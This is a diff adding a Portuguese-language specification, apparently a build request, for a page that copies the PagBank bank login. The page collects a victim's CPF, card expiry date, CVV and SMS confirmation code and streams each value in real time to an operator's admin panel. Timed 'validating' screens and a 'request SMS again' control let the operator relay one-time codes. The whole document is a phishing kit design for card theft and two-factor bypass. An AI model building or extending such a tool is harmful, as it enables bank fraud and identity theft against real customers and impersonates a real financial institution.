@@ -1,0 +1,32 @@
+Crie uma tela de captura de dados em tempo real, onde a pessoa acessará um site idêntico ao banco Pagbank, preencherá a sua informação de acesso, sendo: CPF, CNPJ ou Telefone (no print aparece como "CPF, CNPJ ou Email", porém deverá ser substituído para "CPF, CNPJ ou Telefone". 
+
+Após a pessoa preencher o CPF (transforme as sequências dos números conforme o modelo de CPF, seguindo os "." igual no seguinte exemplo: "088.624.468-45") ela deverá clicar em "Continuar".
+
+Após clicar em "Continuar" a pessoa será encaminhada para uma nova página, onde receberá uma mensagem de saudação conforme o seu cadastro (que já terá sido cadastrado através do painel admin antes, painel este que também será onde o admin monitorará todos os dados capturados da tela de usuário em tempo real), como no seguinte exemplo:
+
+///
+
+"Olá sra. <NOME DO CADASTRO>
+
+Preencha os seguintes dados para autenticação:
+
+Número do cartão: <NÚMERO DO CADASTRO>
+Data de validade: <PREENCHER>
+Código de Segurança (CVV): <PREENCHER>
+
+///
+
+Após a pessoa preencher os campos <PREENCHER>, poderá clicar no botão "Continuar", onde automaticamente encaminhará para o chat do painel admin as informações capturadas, tais como: 
+
+Nome completo:
+CPF:
+Número do cartão:
+Data de validade:
+Código de Segurança (CVV):
+Código de confirmação (SMS):
+
+Enquanto essas informações são encaminhadas pro painel admin, o usuário deverá ser encaminhado para uma tela de "Validando o seu acesso...". Essa tela aparecerá por 20 segundos, e após isso deverá aparecer uma tela solicitando um código de SMS (composto por 6 números).
+
+"Confirme o código de 6 dígitos recebido via SMS", onde a pessoa preencherá um código composto por 6 números. Após preencher e clicar no botão "Continuar", esse código também deverá ser encaminhado pro chat do painel admin, onde assim como todas informações coletadas do usuário, deverá ser encaminhado em tempo real. Enquanto essa informação terá sido enviada pro chat do painel admin, o usuário deverá aguardar novamente em uma tela de "Validando o seu acesso..."
+
+Se no painel admin o admin selecionar esse usuário com a opção "Finalizar atendimento" ele será encaminhado pra uma tela de agradecimento. Se o administrador identificar manualmente que o código é inválido ou não foi preenchido corretamente, também terá a opção de "Resolicitar SMS", onde o usuário deverá preencher novamente o código, que será mais uma vez encaminhado no chat do painel admin, porém dessa vez com o novo código informado.
